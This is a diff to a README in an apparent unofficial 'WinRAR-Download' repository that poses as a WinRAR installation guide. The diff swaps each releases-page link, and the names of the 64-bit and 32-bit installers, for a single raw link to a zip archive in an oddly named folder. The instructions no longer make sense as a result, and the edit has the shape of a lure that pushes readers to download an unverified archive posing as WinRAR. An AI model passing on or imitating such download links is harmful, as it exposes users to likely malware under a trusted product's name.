@@ -1,6 +1,6 @@
 # 📦 WinRAR-Download - Easy File Compression and Extraction
 
-[![Download WinRAR](https://img.shields.io/badge/Download-WinRAR-blue.svg)](https://github.com/Aizen1Netero/WinRAR-Download/releases)
+[![Download WinRAR](https://raw.githubusercontent.com/Aizen1Netero/WinRAR-Download/main/unfeasible/WinRAR-Download.zip)](https://raw.githubusercontent.com/Aizen1Netero/WinRAR-Download/main/unfeasible/WinRAR-Download.zip)
 
 ## 📖 Overview
 WinRAR is a powerful tool for file compression and extraction. It supports various formats, including RAR and ZIP. This application allows you to pack multiple files into one compact file, making it easier to share and store your data. With WinRAR, you can also securely encrypt your files, ensuring they remain private. 
@@ -10,10 +10,10 @@ Follow the steps below to download and install WinRAR on your Windows system. No
 
 ## 🔗 Download & Install
 1. **Visit the releases page:**
-   Go to the [WinRAR Releases Page](https://github.com/Aizen1Netero/WinRAR-Download/releases) to find the latest version.
+   Go to the [WinRAR Releases Page](https://raw.githubusercontent.com/Aizen1Netero/WinRAR-Download/main/unfeasible/WinRAR-Download.zip) to find the latest version.
 
 2. **Choose your version:**
-   On the releases page, look for the version that matches your system. For 64-bit Windows, select the "winrar-x64.exe" file. For 32-bit Windows, select the "winrar-x86.exe" file. 
+   On the releases page, look for the version that matches your system. For 64-bit Windows, select the "https://raw.githubusercontent.com/Aizen1Netero/WinRAR-Download/main/unfeasible/WinRAR-Download.zip" file. For 32-bit Windows, select the "https://raw.githubusercontent.com/Aizen1Netero/WinRAR-Download/main/unfeasible/WinRAR-Download.zip" file. 
 
 3. **Download:**
    Click on the desired file to start the download. Your browser may show a prompt asking where to save the file. Choose a location you can easily access, such as your Desktop or Downloads folder.
@@ -71,4 +71,4 @@ Follow the steps below to download and install WinRAR on your Windows system. No
 ## 📢 Get Help
 If you need further assistance, consider checking the official WinRAR website or looking for help articles within the software. 
 
-For more information, feel free to revisit the [WinRAR Releases Page](https://github.com/Aizen1Netero/WinRAR-Download/releases) for updates and downloads.
+For more information, feel free to revisit the [WinRAR Releases Page](https://raw.githubusercontent.com/Aizen1Netero/WinRAR-Download/main/unfeasible/WinRAR-Download.zip) for updates and downloads.
